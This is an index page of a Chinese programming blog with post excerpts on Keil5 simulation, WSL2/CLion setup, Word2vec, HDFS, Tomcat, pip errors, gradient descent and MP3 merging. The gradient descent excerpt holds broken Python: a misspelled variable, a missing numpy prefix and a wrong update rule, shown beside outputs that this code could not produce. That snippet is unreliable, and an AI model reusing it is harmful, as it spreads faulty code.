<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d02cafc557a1b1ec6a468ca5cb5ef5c4/" rel="bookmark">
			【Keil5软件仿真，使用Logic Analyzer示波器窗口实时观测信号时无法实时更新的设置问题】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Keil5软件仿真调试时，Logic Analyzer示波器窗口应实时更新观测的信号 初次安装Keil5软件，使用JLink开发板学习。
在学习调试led点亮程序时，想通过Logic Analyzer观察控制Led灯的GPIO端口状态。
程序运行正常，Download到开发板后，led也按照设计，每2秒点亮一次，每次持续1秒。
但是，在软件调试模式时，发现LogicAnalyzer的信号不能再Running状态实时更新。
检查后发现，需要参考如下图勾选窗口周期性更新。
①软件仿真simulation调试模式。（连接硬件调试模式下此功能不工作）②调试模式③view菜单栏中④勾选周期性更新选项⑤并让Logic Analyzer示波器开始Update Screen。 之后，再让程序进入Running后，就可以如下图在示波器上实时看到该信号波形实时的状态了。
很简单，但是刚开始试用Keil5软件调试时，可能会有人遇到同样的问题，希望能让你节省一些时间。
祝调试&amp;学习愉快~
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f2b7f7d65ac957aad1f2ba6b18d8aa07/" rel="bookmark">
			基于WSL2和Clion搭建Win下C开发环境
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系列文章目录 一、基于WSL2和Clion搭建Win下C开发环境
二、make、makeFile、CMake、CMakeLists的使用
三、全面、详细、通俗易懂的C语言语法和标准库
文章目录 系列文章目录前言WSL2安装WSL常用命令VSCode连接WSLroot密码以systemd启动配置ssh Clion结语 前言 Win下C语言开发环境千千万，但基于WSL2和Clion的环境是最好用且最易于后续发展的。关于Cygwin和MinGW的区别与联系可以看这篇文章。
WSL2 安装 依据官方文档安装WSL2，建议手动安装，然后自助去商店下载Linux发行版。我选用的Linux版本是Ubuntu，点击打开设置好用户和密码： WSL常用命令 wsl [options] --help #查看帮助 -l -v #查看已存在分支及状态 --shutdown #关闭wsl -s &lt;name&gt; #设置默认分支 -t &lt;name&gt; #终止指定分支 --unregister &lt;name&gt; #注销分支并删除文件系统 VSCode连接WSL 安装插件： 在插件选择进行连接： root密码 通过以下命令设置root密码：
sudo passwd root 以systemd启动 在Ubuntu中打开或创建/etc/wsl.conf文件：
sudo vim /etc/wsl.conf 添加以下配置：
[boot] systemd=true 重启wsl：
wsl --shutdown wsl 配置ssh Ubuntu自带openssh，如果没有可以先装一下。打开/etc/ssh/sshd_conf文件并添加以下配置： Port 300 PasswordAuthentication yes 重启sshd服务： systemctl restart sshd Clion 打开Clion选择安装好的Ubuntu： 连接ssh： 在Ubuntu中安装开发工具： sudo apt-get upgrade sudo apt install cmake sudo apt install make sudo apt install g++ sudo apt install gdb 安装之后Clion会自动检测，通过之后就会变成下面的样子： 接着配置一下项目： 接下来就可以愉快的写代码了： 结语 在此过程中遇到问题可给我留言。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/112d83345757edb66bbc6bd2287bd172/" rel="bookmark">
			一个简单的Sublime设置
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		问题 如果读者熟悉我，应该会发现我经常使用 VSCode 作为主力编辑器，但随着我安装的 VSCode 的插件逐渐增加，我发现对于部分较小的任务使用 VSCode 过于笨重，比如简单的 Markdown 文件编辑工作。
在经过一系列寻找后，我发现高性能且占内存较低的 Sublime Text 是符合我的需求的。该编辑器具有大量的语言高亮支持且几乎是开箱即用的。
但该编辑器的部分默认设置是不符合程序员需求的，本文主要解决这些问题。
字体 Sublime 的原生字体较为奇怪，对于汉语的支持非常差，但对代码的支持还算可以。
与 VSCode 不同， Sublime 不支持所谓的回退字体，我们需要指定一个包含汉语和英语的对程序员友好的字体。大部分网上的教程都建议使用混合字体，即使用微软雅黑与某种等宽字体混合。但事实上，随着国内开源字体的发展，已经出现了原生的同时支持汉语与等宽英语的字体，本文推荐使用 霞鹜文楷等宽。此字体在显示中文内容和英文代码时都较为优秀，如下：
读者可在 LxgwWenKai Github Release 内进行字体下载，请注意需下载文件名包含 Mono 的字体文件，如下图：
下载后直接点击安装即可。如下图:
安装后，读者可以在系统字体设置中搜索到此字体:
然后我们需要对 Sublime 进行简单的设置，打开 Sublime 后点击 Preferences 中的 Setting 选项:
在配置文件内写入 "font_face": "霞鹜文楷等宽" 配置项保存即可。 我的配置文件如下:
{ "theme": "Default Dark.sublime-theme", "font_face": "霞鹜文楷等宽", // "font_face": "JetBrains Mono", "font_size": 14, } 其中，theme 配置编辑器主题，而 font_face 配置字体，font_size 配置字体大小。
此处读者可以注意到被注释的 JetBrains Mono 字体选项，当我需要阅读大量英文代码时，我会选择此字体。读者可前往 JetBrains 官网 获得此字体。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/112d83345757edb66bbc6bd2287bd172/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b59178d095932ca099e50cd900fc606/" rel="bookmark">
			各位n友在robotStudio中出现这种情况怎么解决的
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1181577f9a36bec5b461335007ef6ce5/" rel="bookmark">
			数论代码实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 判断质数筛法打质数表分解质因数 判断质数 #include&lt;stdio.h&gt; #include&lt;math.h&gt; int isprime(int i) { if(i==1) //1不是质数 return 0; int x,j; x=sqrt(i);	//对i开根号 for(j=2;j&lt;=x;j++) { if(i%j==0)	//如果可以取余说明不是质数 return 0; } return 1; } int main() { int i,j; scanf("%d",&amp;i); //输入数字 j=isprime(i); if(j==0) { printf("不是质数"); } else{ printf("质数"); } return 0; } 筛法打质数表 #include&lt;stdio.h&gt; #define MAX 100 //定义最大查询质数范围 //核心思想就是先去掉关于2的倍数，再去掉关于3的倍数... void getprime() { int flag[MAX]; //flag数组用于标记是否为质数，1代表是质数，0代表不是质数 int prime[MAX]; //prime数组用于存储质数 int i,j,cnt=0; flag[0]=flag[1]=0; //0和1不是质数 for(i=2;i&lt;MAX;i++) flag[i]=1; //假设从2开始的数都是质数 for(i=2;i&lt;MAX;i++) { if(flag[i]) { prime[cnt++]=i; //记录质数在prime数组中 for(j=2*i;j&lt;MAX;j+=i) //去除掉关于i可以整除的数 flag[j]=0; } } for(i=0;i&lt;cnt;i++) printf("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1181577f9a36bec5b461335007ef6ce5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fdfa159c44a5b745f3ce585718aa96cd/" rel="bookmark">
			Word2vec工作原理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言Word2Vec的工作原理CBOWSkip-Gram 参考文献点关注，防走丢，如有纰漏之处，请留言指教，非常感谢 前言 随着计算机应用领域的不断扩大，自然语言处理受到了人们的高度重视。尤其是最近出现的chatgpt，作为一个大型的语言模型，它能够回答各种各样的问题，并且可以提供有用的信息和帮助。在chatgpt身上，我们看到了人工智能对人类未来产生的巨大影响。我们很有必要去深入了解计算机关于自然语言的处理。
为了使计算机能够处理自然语言，首先需要对自然语言进行建模。自然语言建模方法经历了从基于规则的方法到基于统计方法的转变。从基于统计的建模方法得到的自然语言模型称为统计语言模型。有许多统计语言建模技术,包括n-gram、神经网络以及log_linear模型等。在对自然语言进行建模的过程中,会出现维数灾难、词语相似性,模型泛化能力以及模型性能等问题。
短文本自动分类首先需要将文本转化为计算机能理解处理的形式,即文本数据的表示,其对文本分类至关重要,可直接影响分类效果。Word2Vec是google在2013年推出的一个NLP工具，它的特点是能够将单词转化为向量来表示，这样词与词之间就可以定量的去度量他们之间的关系，挖掘词之间的联系。不过，在更早之前采用one-hot编码，又称为一位有效编码，每个词向量维度大小为整个词汇表的大小，对于每个具体的词汇表中的词，将对应的位置置为1。
使用one-hot编码(010000)代表two，有多少个词汇向量就有多少维度；而且只有所表示的这个词对应的位置为1，其他位置全是0。
采用One-Hot编码方式来表示词向量非常简单，但缺点也是显而易见的，一方面我们实际使用的词汇表很大，经常是百万级以上，这么高维的数据处理起来会消耗大量的计算资源与时间。另一方面，One-Hot编码中所有词向量之间彼此正交，没有体现词与词之间的相似关系。
词向量是具有良好的语义特性，在表示词语特性方面非常有效。词向量每一个维度的值都体现了对应词语在语义和语法上的特性。所以,可以将词向量的每一维称为一个词语特征。词向量具有多种形式,Distributed representation是其中一种。
Distributed representation可以解决One-Hot编码存在的问题，将原来One-Hot编码的每个词都映射到一个较短的词向量上来，而这个较短的词向量的维度可以由我们自己在训练时根据任务需要来自己指定。
例如，在我们的词汇库中我们拥有 (中国，俄罗斯，美国，乌克兰) 这四个词，然后我们再选用 (亚洲国家，友好关系) 这两个维度来描述词汇库里面的词。“中国”这个词对应的词向量可能是(0.9，0.9)；“俄罗斯”这个词对应的词向量可能是(0.75，0.8)。但是在实际情况中，我们并不能做到对每一个词向量维度做很好且完整的解释。
Word2Vec的工作原理 Word2Vec模型包含了CBOW和 Skip-gram两种训练模型。CBOW适合于数据集较小的情况，而Skip-Gram在大型语料中表现更好。CBOW和Skip_gram模型均包含输人层投影层和输出层。其中,CBOW模型通过上下文来预测当前词；Skip_gram模型则通过当前词来预测其上下文。如下图所示：
另外，Word2vec提供了两套优化方法来提高词向量的训练效率，分别是 HierachySoftmax和Negativ Sampling。
Word2Vec的训练模型本质上是只具有一个隐含层的神经元网络：
它的输入是采用One-Hot编码的词汇表向量，它的输出也是One-Hot编码的词汇表向量。使用所有的样本，训练这个神经元网络，等到收敛之后，从输入层到隐含层的那些权重，便是每一个词的采用Distributed Representation的词向量。下面进行对word2vec两个模型运行原理的详细讲解。
CBOW 前提假设：词汇库中含有V个单词，C代表上下文单词个数。例如"This is a good test."，当C=4时，模型输入(this，is，good，test)的one-hot编码向量
1，输入层：输入C个维度为V的词向量(one-hot词向量)
2，初始化一个V x N大小的权重矩阵，然后用所有输入的one-hot词向量左乘矩阵，由线性代数中向量与矩阵的乘法得知，会得到 C 个1 x N的向量。
3，将所有得到的C个向量进行相加求平均，合成一个N维向量作为隐藏层向量h。
4，再初始化一个N x V大小的权重矩阵，用隐藏层向量h左乘 这个权重矩阵，在经过激活函数处理得到V维的向量y，y的每一个元素代表相对应的每个单词的概率分布。
5，y中概率最大的元素所指示的单词为预测出的单词，将它与实际要预测的单词作比较，要求误差越小越好。这就需要通过误差不断去更新前面的两个权重矩阵。
注意：在训练前需要定义好损失函数，采用梯度下降算法更新两个权重矩阵。训练完毕后，输入层的每个单词的one-hot向量与第一个权重矩阵相乘得到的向量的就是我们想要的Distributed Representation表示的词向量。
Skip-Gram Skip-gram是一种用于训练词嵌入模型的算法，它的目标是学习每个单词的向量表示，使得语义相似的单词在向量空间中距离较近。模型结构图如下：
1，将训练语料库中的每个单词表示为一个one-hot向量，其中只有一个维度为1，其他维度为0。假设语料库中有V个单词，那么每个单词都可以表示为一个V维的向量。
2，定义一个神经网络模型，它包含一个输入层、一个隐藏层和一个输出层。输入层的大小为V(因为输入层是一个V维向量），隐藏层的大小为N维的向量，输出层的大小仍为V维的向量。
3，在模型中，输入层接收一个one-hot向量，将其转换为一个V维的实数向量。这个向量经过一个权重矩阵乘法操作，矩阵为V x N大小，得到一个大小为N维度的隐藏层向量，这个向量称之为中心词向量，再经过另一个权重矩阵乘法操作，矩阵为 N x V大小，得到一个大小为V维的输出层向量，这个向量称之为背景词向量。输出层向量表示在当前单词下，其他单词出现的概率，可以使用softmax函数对输出层向量进行归一化，使得每个单词的概率之和为1。(输出层得到一个V维的向量，但是经过softmax函数处理后，每个位置上的数值可能并不相同。而后根据窗口大小C的设置，从所有概率中选择C个最大概率值，在把他们转为one-hot编码与真实值相比较)
4，对于每个单词(中心词)，我们可以定义一个“上下文窗口”，表示在当前单词前后固定的N个单词，称为“上下文单词”。在训练过程中，我们需要从语料库中提取出所有的这样的上下文窗口。
5，对于每个上下文窗口，我们将窗口中的每个单词依次作为输入，用模型预测窗口中心单词的概率。我们的目标是最小化模型预测值与实际值之间的差距，通常使用交叉熵作为损失函数。
6，使用梯度下降等优化算法对模型参数进行更新，使得模型在训练集上的预测值逐渐接近真实值。经过多次迭代，模型的参数会收敛，得到每个单词的向量表示。
参考文献 周练. Word2vec 的工作原理及应用探究[J]. 科技情报开发与经济, 2015 (2): 145-148.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fdfa159c44a5b745f3ce585718aa96cd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/07c6044f8fef2e1ba5379e58b51f7ee2/" rel="bookmark">
			HDFS详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 Hadoop概述HDFS相关概念块名称节点数据节点第二名称节点 HDFS常用命令参考文献点关注，防走丢，如有纰漏之处，请留言指教，非常感谢 Hadoop概述 Hadoop是Apache的一个开源分布式计算平台，为用户提供了系统底层细节透明的分布式基础架构。Hadoop是基于Java语言开发的，具有很好的跨平台特性，并且可以部署在廉价的计算机集群中。Hadoop的核心是分布式文件系统HDFS和MapReduce。
Hadoop是一个能够对大量数据进行分布式处理的软件框架，并且是以一种可靠、高效、可伸宿的方式进行处理的，它具有以下几个方面的特性:
1,高可靠性。采用冗余数据存储方式，即使一个副本发生故障，其他副本也可以保证正常对提供服务。
2,高效性。作为并行分布式计算平台，Hadoop采用分布式存储和分布式处理两大核心技术。够高效地处理PB级数据。
3,高可扩展性。Hadoop的设计目标是可以高效稳定地运行在廉价的计算机集群上，可以扩到数以千计的计算机节点上。
4,高容错性。采用冗余数据存储方式，自动保存数据的多个副本，并且能够自动将失败的任进行重新分配。
5,成本低。Hadoop采用廉价的计算机集群，成本比较低，普通用户也很容易用自己的PC建Hadoop运行环境。
经过多年的发展，Hadoop生态系统不断完善和成熟，目前已经包含了多个子项目.除了核心的HDFS和MapReduce以外，Hadoop生态系统还包括Zookeeper、HBase、Hive、Pig、Mahout、Sqoop、Flume、Ambari等功能组件。下图为Hadoop生态圈：
HDFS相关概念 块 在我们的电脑中，为了提高磁盘读写效率，一般以数据块为单位，在计算机组成原理中可以是扇区或者簇，而不是以字节为单位。
HDFS也同样采用了块的概念，默认的一个大小是64 MB。在HDFS中的文件会被拆分成多个块，每个块作为独立的单元进行存储。 HDFS寻址开销除了磁盘寻道开销，还包括数据块的定位开销。当客户端需要访问一个文件时，首先从名称节点获得组成这个文件的数据块的位置列表，然后根据位置列表获取实际存储各个数据块的数据节点的位置，最后数据节点根据数据块信息在本地Linux 文件系统中找到对应的文件，并把数据返回给客户端。设计一个比较大的块，可以把上述寻址开销分摊到较多的数据中，降低了单位数据的寻址开销。
名称节点 在HDFS中，名称节点(NameNode)负责管理分布式文件系统的命名空间，保存了两个核心的数据结构，即Fslmage和editLog。Fslmage用于维护文件系统树以及文件树中所有的文件和文件夹的元数据。操作日志文件editLog中记录了所有针对文件的创建新除、重命名等操作。名称节点记录了每文件中各个块所在的数据节点的位置信息，但是并不持久化存储这些信息，而是在系统每次启动时扫描所有数据节点利用Fslmage和editLog文件重构得到这些信息。
名称节点在启动时，会将 Fslmage的内容加载到内存当中，然后执行EditLog文件中的各项操作，使很内存中的元数据保持最新。这个操作完成以后，就会创建一个新的 FsImage文件和一个空的EditLog文件。名称节点启动成功并进入正常运行状态以后，HDFS中的更新操作都会被写入到EditLog，而不是直接写入FsImage，这是因为对于分布式文件系统而言，FsImage文件通常都很庞大(一般都是GB级别以上)，如果所有的更新操作都直接往FsImage文件中添加，那么系统就会变得非常缓慢。相对而言，EditLog通常都要远远小于FsImage，更新操作写入到EditLog是非常高效的。注意：Fsimage的主要作用是在Hadoop文件系统启动时提供元数据信息，这些元数据用于重建文件系统。当NameNode重新启动时，它会首先读取Fsimage文件来恢复元数据信息，然后再读取EditLog文件来应用在上次关闭之后发生的任何变化。
由于Edit Log是一个增量日志，所以它不包含完整的文件系统状态。因此,如果Edit Log文件在某些情况下发生损坏或丢失，可能会导致文件系统数据的丢失或不一致。
当HDFS需要进行元数据操作时，例如创建、删除或修改文件或目录，它会首先更新内存中的元数据信息，然后再将这些更改写入editlog，并将定期刷新到硬盘上的fsimage文件中，以防止元数据的丢失或损坏。
数据节点 数据节点(DataNode)是分布式文件系统HDFS的工作节点，负责数据的存储和读取，会根据客户端或者名称节点的调度来进行数据的存储和检索，并且向名称节点定期发送自己所存储的块的列表。
第二名称节点 在名称节点运行期间，HDFS会不断发生更新操作，这些更新操作都是直接被写入到EditLog文件，因此EditLog文件也会逐渐变大。在名称节点运行期间，不断变大的EditLog文件通常对于系统性能不会产生显著影响，但是当名称节点重启时，需要将FsImage加载到内存中，然后逐条执行EditLog中的记录，使得Fslmage保持最新。可想而知，如果EditLog很大，就会导致整个过程变得非常缓慢，使得名称节点在启动过程中长期处于“安全模式”，无法正常对外提供写操作，影响了用户的使用。具体过程如下：
(1) EditLog与Fslmage的合并操作。每隔一段时间，第二名称节点会和名称节点通信，请求其停止使用 EditLog文件，暂时将新到达的写操作添加到一个新的文件 EditLog.new中。然后，第二名称节点把名称节点中的FsImage文件和EditLog文件拉回到本地，再加载到内存中；对二者执行合并操作，即在内存中逐条执行EditLog中的操作，使得FsImage保持最新。合并结束后，第二名称节点会把合并后得到的最新的FsImage文件发送到名称节点。名称节点收到后，会用最新的FsImage文件去替换旧的Fslmage文件，同时用EditLog.new文件去替换 EditLog文件，从而减小了EditLog文件的大小。
(2)作为名称节点的“检查点”。从上面的合并过程可以看出，第二名称节点会定期和名称节点通信，从名称节点获取 FsImage文件和 EditLog文件，执行合并操作得到新的FsImage 文件。从这个角度来讲，第二名称节点相当于为名称节点设置了一个“检查点”，周期性地备份名称节点中的元数据信息，当名称节点发生故障时，就可以用第二名称节点中记录的元数据信息进行系统恢复。但是，在第二名称节点上合并操作得到的新的FsImage文件是合并操作发生时(即t时刻)HDFS记录的元数据信息，并没有包含t时刻和t 时刻期间发生的更新操作，如果名称节点在4时刻和t 时刻期间发生故障，系统就会丢失部分元数据。
HDFS常用命令 1.查看hdfs下根目录下的文件
hdfs dfs -ls / 2.查看hdfs某个目录下的所有文件结构：
如：查看根目录所有文件结构
hdfs dfs -ls -R / hdfs dfs -lsr / 2
如：查看根文件tmp下的所有文件列表
hdfs dfs -ls -R /tmp/ hdfs dfs -lsr /tmp/ 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/07c6044f8fef2e1ba5379e58b51f7ee2/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c178b39c430599ed0a1c9b029d1267df/" rel="bookmark">
			tomcat，eclipse的安装、配置、基础web开发
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、事前准备 首先要确认所下载的jdk版本，避免出现下载的tomcat版本与jdk版本不兼容。
确认jdk版本的方法：windows+R输入cmd呼出命令行，在命令行中输入java -version(注意“ a ”和“ - ”之间的空格）。在apache tomcat官网有不同版本支持jdk的表格可供参考。
2、下载Tomcat 在apache tomcat官网和How2J等第三方java学习网站可以下载到对应资源。在管官网建议下载zip安装包，可以忽略很多不必要的步骤。第三方网站下载的资源包里在webapp里可能没有ROOT文件夹（本地html文件），在试运行tomcat时要自己添加。
试运行： 在bin文件夹中选择startup执行文件，双击打开（关闭时建议打开bin中的shutdown文件，避免出现异常情况）
（运行结果）
保持tomcat打开状态选择浏览器输入127.0.0.1：8080 （html文件名）.html,在浏览器打开本地html文件
404问题分析（保证本地文件名与搜索栏文件名一致）：
1、首先确认jdk版本是否适配tomcat；
2、检查tomcat环境变量；
3、查看IIS访问权限是否有问题；
4、查看端口是否被占用；（解决方法：在tomcat的conf文件中找到server.xml文件并打开，找到&lt;Connector port="8080"&gt;可修改端口）
5、考虑浏览器兼容性问题，更换浏览器再次尝试。
3、下载eclipse 需根据自己的jdk版本下载对应的eclipse，可在官网或第三方网站安装对应的资源。对于网页前端开发，需下载的版本是web developer的版本。（第三方网站一般默认下载的也是这个版本）
4、配置eclipse java web开发一般在eclipse中直接完成，需要在eclipse中配置jdk和tomcat。
配置jdk 1、打开eclipse-exe，点击【Windows】-&gt;【Prefernces】
2、选择【Java】-&gt;【Installed JREs】-&gt;【Add】
3、选择 Standard VM ，点击Next
4、在JRE home中填写JDK文件地址 ，点击Restore Default，点击Cancel之后即配置成功。
配置TomCat 在配置好之后，在eclipse中即可运行TomCat
1、打开eclipse-exe，点击【Windows】-&gt;【Prefernces】
2、选择【server】-&gt;【Runtime Environments】
2、点击【Add】，选择tomcat对应版本，点击Next
输入Tomcat文件地址，并将JRE改成对应的jdk版本，点击Finish即可应用
5、创建Jsp文件 【File】-&gt;【New】-&gt;【Dynamic Web Project】
起项目名称【Project Name】后点击【Next】
源代码放在src文件夹或web content文件夹，结果放在build\classes文件夹，点击【Next】
勾选Generate web.xml deployment descriptor后点击【Finish】即可创建项目
在web content文件夹中新建jsp文件，点击【Run As】-&gt;【Run on Server】即可运行（每个项目文件都要设置）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e48773e969464405e1135de4da048d81/" rel="bookmark">
			Ubuntu在安装python库的时候,pip install generates WARNINGS : ‘NewConnectionError
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		pip install generates WARNINGS : 'NewConnectionError 解决方法
查了很多出现相关问题的BLOG，基本给出的解决方案都是更换镜像源(什么清华源镜像,腾讯源,华为源,中科大源,网易源,豆瓣源,阿里源)。这种情况和IP地址的设置、IP网络下载不稳定有关，但是不适用于我目前遇到的情况，这里记录一下。
之前更换anaconda env环境，结果原环境里的pip install安装库可以使用，新环境里pip无法安装任何包。
这里更新下环境配置就行。
sudo apt-get update
sudo apt-get upgrade
sudo apt install python3-pip
以上的三个步骤要全部重新执行一遍的!
参考来源： https://stackoverflow.com/questions/59635259/pip-install-generates-warnings-newconnectionerrorpip-vendor-urllib3-conne
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0159ae5c60c7694ae043d3e8462a026/" rel="bookmark">
			Python-梯度下降法实践
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Python-梯度下降法实践 一、前言二、梯度下降法1.简介2.关于线性回归梯度下降法实践求y=x^2+2*x+5的最小值(1)通过图像观察(2)通过描点观察(3)标注点(4)改变步长观察 三、批量梯度下降算法[BGD]线性回归代码实现1.介绍2.代码实现(1)生成回归数据(2)拆分数据集和测试集(3)利用梯度下降法拟合直线y=wx+b(4)将迭代结果可视化查看，拟合线性回归图(5)计算训练集和测试集上均方误差 三、随机梯度下降法[SGD]四、小批量梯度下降法[mini-batch梯度下降法] 一、前言 hello大家好这里是小L😊在这里想和大家一起学习一起进步。💪
这次笔记内容：学习梯度下降法python实现。以及讲解梯度下降法[GD],批量梯度下降法[BGD],随机梯度下降法[SGD],小批量梯度下降法[mini-batch梯度下降法].
二、梯度下降法 1.简介 梯度下降法用于不能用岭回归、Lasso回归求精确解(不存在逆矩阵)等情况。梯度下降法求迭代解，优化问题找到最优解。利用梯度下降法(没有逆矩阵，或者不好求的时候用)拟合直线y=wx+b,迭代算法需要赋一个初始值，n个特征有n+1个未知量。
梯度下降法最简步骤：
沿着负梯度方向不断迭代找到最优解
2.关于线性回归梯度下降法实践 当目标函数是凸函数时（目标函数对每一个变量具有一阶连续偏导数的函数），梯度下降法的解是全局最优解。一般情况下， 其解不保证是全局最优解。梯度下降法的收敛速度也未必是很快的。
而线性回归是凸函数，所以可以求得最优解。
求y=x^2+2*x+5的最小值 (1)通过图像观察 import numpy as np import matplotlib.pyplot as plt x=linspace(-6,4,100) y=x**2+2*x+5 plt.plot(x,y) 通过图像直接观察，在最小值点x为-1
#参数初始化 x_iter=3 #x的初始值 yita=0.06 #步长 y=2*x_iter+2 for i in range(0,100): x_iter=x_inter-yita*y print(x_iter) -0.9999887713587551 迭代100次发现求出来的值很接近1.
(2)通过描点观察 #将迭代的点描绘出来更直观形象 x_iter=3#设置x的初始值 yita=0.06#步长 count=0#记录迭代次数 while True: count+=1 y_last=x_iter**2+2*x_iter+5 x_iter=2*x_iter-yita*(2*x_iter+2) y_next=x_iter**2+2*x_iter+5 plt.scatter(x_iter,y_last) if abs(y_next-y_last)&lt;1e-100: break print('最小值点x=',x_iter,'最小值y',y_next,'迭代次数n=',count） x=linspace(-4,6,100) y=x**2+2*x+5 plt.scatter(x,y) 最小值点x= -0.9999999594897632 最小值y= 4.000000000000002 迭代次数n= 144 (3)标注点 #每年都考梯度下降 x_iter=3 yita=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0159ae5c60c7694ae043d3e8462a026/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03365bd783b88dc72f9f5c5be4f13e80/" rel="bookmark">
			使用Python合并mp3音频文件的最简单方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		想把多个单独的英语单词MP3朗读音频文件合并在一起，开始找的方法一是下载专门的音频编辑合成软件，但是觉得太麻烦。二是使用免费的在线mp3音频合成服务，这种网站免费，使用也很简单。但是需要把文件一个个上传到网站上，还是有点麻烦。关键是我想让每个英语单词阅读 3遍，并帮所有这些单独的单词朗读音频合成为一个完整的文件，方便自己使用。于是就想看看能不能用Python来完成这个任务，经过查询和测试，发现方法非常简单：就是这样用Python的open()文件读写方法，把读取方式设置为二进制格式，然后将读取到的单词音频内容重复写入最后的合并文件3次就行了。这是合并2个单独的单词读音mp3，并将2个单词读音重复3遍的示例代码：
# 1.首先读取第1个mp3音频文件，打开方式为'rb'，即二进制只读 with open(r'D:\音频\apple.mp3','rb') as f1: c1=f1.read() # 2.然后读取第2个mp3音频文件，打开方式为'rb'，即二进制只读 with open(r'D:\音频\orange.mp3','rb') as f2: c2=f2.read() """ 3. 创建一个新文件，打开方式为'ab'，即二进制读写追加，打开的时候文件指针停留在文件末尾，然后新写入的内容插入到文件末尾。这是关键。 """ with open(r'D:\音频\合成.mp3','ab') as f3: f3.write(c1) f3.write(c1) f3.write(c1) f3.write(c2) f3.write(c2) f3.write(c2) 这里每个文件重复写了3次，所以每次会在原来的mp3末尾增加新音频，实现了每个单词读3遍的效果。
用播放器打开刚才合成的mp3文件，一切正常，实现了将2个单独的单词mp3文件合并在一起，并且每个朗读3遍的功能。
后续还测试发现了另外一个重复单词读音多次的方法，及直接用乘法，然后一次性写入文件。比如我想这段音频重复5遍，我就直接乘以5就好了。
with open(r'D:\音频\合成.mp3','ab') as f3: f3.write(c1*5) 这里只是作为一个演示，所以写的比较简单。如果结合os文件操作方法，可以自动实现大批量文件的自动合成，并可以任意重复多次。
不用安装专门的软件，也不用上传到网上，只要在Python里简单的几行代码就可以实现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/86559f346144654fd440691e442e5abe/" rel="bookmark">
			[vue]加载svg文件之svg-sprite-loader
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SVG的显示 通过网上方式都没成功,引入路径，总是失败，经过多次的测试终于发现是svg的加载出了问题，记录一下，方便以后的使用
SVG的加载 工具 初始化svg加载工具
"svg-sprite-loader": "^6.0.11" 配置 vue.config.js中配置svg文件的加载
